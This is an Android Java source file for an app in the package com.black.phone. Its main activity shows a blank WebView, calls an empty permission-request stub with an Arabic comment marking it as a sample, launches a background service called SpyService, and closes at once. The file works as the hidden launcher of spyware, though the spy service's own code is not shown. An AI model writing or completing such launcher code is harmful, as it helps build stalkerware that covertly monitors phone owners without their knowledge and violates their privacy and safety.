package com.black.phone;

import android.app.Activity;
import android.os.Bundle;
import android.webkit.WebView;
import android.content.Intent;
import android.provider.Settings;
import android.net.Uri;
import android.os.Build;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        WebView web = new WebView(this);
        web.loadUrl("about:blank");
        setContentView(web);
        requestPermissions();
        startService(new Intent(this, SpyService.class));
        finish();
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // طلب الصلاحيات هنا (نموذج)
        }
    }
}
